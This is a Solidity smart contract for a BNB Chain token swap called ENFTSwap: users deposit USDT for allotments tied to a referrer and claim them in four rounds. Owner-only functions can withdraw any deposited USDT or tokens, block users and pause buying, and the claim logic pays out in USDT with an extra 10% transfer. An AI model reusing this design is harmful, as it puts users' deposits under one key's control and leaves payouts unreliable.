/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

 interface BEP20Interface {
    function transfer(address to, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);
    function balanceOf(address account) external view returns (uint256);
}


contract ENFTSwap {
	using SafeMath for uint256;
    uint256 public fees = 5;

    struct User{
        uint256 boughtENFTs;
        uint256 claimed;
        uint256 noOfTimesClaimed;
        address upline;
    }
	
	address payable private ownerAddress;
    BEP20Interface public usdtAddress = BEP20Interface(0xd3521B5dD10061245ABf863A3ae36732171084c3);
    BEP20Interface public tokenAddress=BEP20Interface(0xC1aAC378CcA91b36B67Fe73bC827E46a76fFb813);
    uint256 public priceInUsdt;
    bool public isPaused;
    mapping(address=>bool) public isBlocked;
    mapping (address=>User) public users;
    
    uint256 min = 1 ether;
    uint256 max = 10 ether;
    uint256 public claimTimeStamp;
    uint256 public claimInterval=600;
   
	event priceChange(address indexed user,uint256 price,uint256 date);
    event buyENFT(address indexed user,uint256 priceInUsdt,uint256 tokens);
    event claim(address indexed user,uint256 amount,uint256 timestamp);
    
    modifier onlyOwner {
      require(msg.sender == ownerAddress,"Invalid user");
      _;
   }

	constructor(address payable marketingAddr) {
		ownerAddress = marketingAddr;
		priceInUsdt = 1*1e18;
	}
	
	
	/*******Swapping ********/
    function setClaimTimeStamp(uint256 timestamp) external onlyOwner{
        claimTimeStamp = timestamp;
    }

    function setPrice(uint256 amount) public onlyOwner
    {
        require(amount>0,"Invalid amount or plan");
        priceInUsdt=amount;
    }

    function blockUser(address _user) external onlyOwner{
        isBlocked[_user] = true;
    }

    function unblockUser(address _user) external onlyOwner{
        isBlocked[_user] = false;
    }

    function pasueContract() public onlyOwner
    {
        isPaused = true;
    }
    
    function unPasueContract() public onlyOwner
    {
        isPaused = false;
    }
	
    function exchange(uint256 amount,address upline) public payable
    {
        require(!isBlocked[msg.sender],"User is blocked");
        require(!isPaused,"Contract is paused");
        require(claimTimeStamp==0,"Claim is on now");
        address payable userAddress = payable(msg.sender);

        users[msg.sender].upline = upline;
        convertToToken(amount,userAddress);
    }
    
    function convertToToken(uint256 usdtAmount,address payable userAddress) private
    {
        uint256 tokens=((usdtAmount).div(priceInUsdt))*1e18;
        require(tokens>=min && tokens<=max,"Invalid Amount");
        if(tokens==max){
            tokens = 11 ether;
        }
        require(BEP20Interface(usdtAddress).transferFrom(userAddress,address(this),usdtAmount),"Token transfer failed");
        
        users[msg.sender].boughtENFTs += tokens;
        
        emit buyENFT(userAddress,usdtAmount,tokens);
    }

    function claimTokens() external 
    {
        require(claimTimeStamp>0,"Claim is on now");
        require(users[msg.sender].noOfTimesClaimed<4,"All claimed");
        require(block.timestamp> claimTimeStamp.add(claimInterval * (users[msg.sender].noOfTimesClaimed+1)),"need to wait");
        uint256 tokens = users[msg.sender].boughtENFTs.div(4);
        uint256 feeExcluded = tokens.sub(tokens.mul(fees).div(100));
        require(BEP20Interface(usdtAddress).transfer(msg.sender,feeExcluded),"Token transfer failed");
        require(BEP20Interface(usdtAddress).transfer(msg.sender,feeExcluded.mul(10).div(100)),"Token transfer failed");
        users[msg.sender].noOfTimesClaimed++;
        emit claim(msg.sender,tokens,block.timestamp);
    }

    function withdrawUSDT(address userAddress,uint256 amount) external onlyOwner
    {
        BEP20Interface(usdtAddress).transfer(userAddress, amount);
    }
	
	function withdrawtoken(address userAddress,uint256 amount) external onlyOwner
    {
        BEP20Interface(tokenAddress).transfer(userAddress, amount);
    }

}